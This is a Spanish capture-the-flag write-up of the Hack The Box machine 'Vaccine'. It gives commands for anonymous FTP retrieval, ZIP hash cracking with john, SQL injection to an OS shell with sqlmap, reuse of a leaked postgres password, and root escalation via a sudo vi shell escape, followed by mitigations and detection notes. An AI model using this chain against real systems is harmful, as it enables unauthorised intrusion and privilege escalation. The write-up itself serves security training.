---
machine: Vaccine
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [ftp, sqli, postgresql, sudo, tier2]
---

# Vaccine — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

FTP anónimo entrega `backup.zip`; se rompe el ZIP, dentro está el hash del administrador, se entra al panel y su buscador es inyectable. `sqlmap --os-shell` da shell como `postgres`, y `sudo vi` sobre `pg_hba.conf` escala a root.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
21/tcp ftp     vsftpd 3.0.3
22/tcp ssh     OpenSSH 8.0p1 Ubuntu
80/tcp http    Apache httpd 2.4.41 (Ubuntu)
```

## Enumeración

```bash
ftp <TARGET_IP>          # anonymous / <Enter>
ftp> get backup.zip
zip2john backup.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
unzip backup.zip
```

Dentro: `index.php` con el hash MD5 del administrador y la lógica del login. Se rompe con rockyou y se accede al panel.

## Foothold

El buscador del dashboard concatena el término en una consulta PostgreSQL (`ILIKE`). Se confirma con una comilla y se automatiza:

```bash
sqlmap -u "http://<TARGET_IP>/dashboard.php?search=test" \
  --cookie="PHPSESSID=<SESION>" --os-shell --batch
```

```text
os-shell> id
uid=33(www-data) ...
```

Se lanza un reverse shell desde `--os-shell` (no se escala dentro de esa shell) y se obtiene sesión como `www-data`.

## Movimiento lateral

```bash
cat /var/www/html/index.php
```

El código revela las credenciales de `postgres` (`P@s5w0rd!`), reutilizadas en el sistema:

```bash
su postgres
```

## Escalada de privilegios

```bash
sudo -l
# (root) /bin/vi /etc/postgresql/11/main/pg_hba.conf
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dentro de `vi`:

```text
:set shell=/bin/sh
:shell
```

```text
# id
uid=0(root)
# cat /root/flag.txt
```

## Evidencia

- `backup.zip` y su hash (redactado).
- `sudo -l` con la regla de `vi` y `id` como root.

## Lecciones aprendidas

- Un ZIP con contraseña no protege nada si el hash es crackeable.
- El código fuente descargado del backup revela tanto el hash como la lógica del SQLi.
- `--os-shell` sirve para el foothold, no para escalar: se sale a una shell real.
- Cualquier editor ejecutable por `sudo` es root (`vi`, `vim`, `nano` con `-e`).

## Mitigaciones y detección

- FTP anónimo deshabilitado; backups cifrados y fuera del alcance público.
- Contraseñas con `password_hash()` (bcrypt/argon2), no MD5.
- Consultas parametrizadas y usuario de BD sin privilegios.
- `sudo` restringido a comandos no interactivos; nunca editores.
- Detección: `sqlmap` en logs (UA y payloads), `sudo vi` en `auth.log`, procesos `sh` hijos de `vi`.

- CWE-89, CWE-916, CWE-250
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1548.003 Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

## Referencias

- [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/)
- [sqlmap — os-shell](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
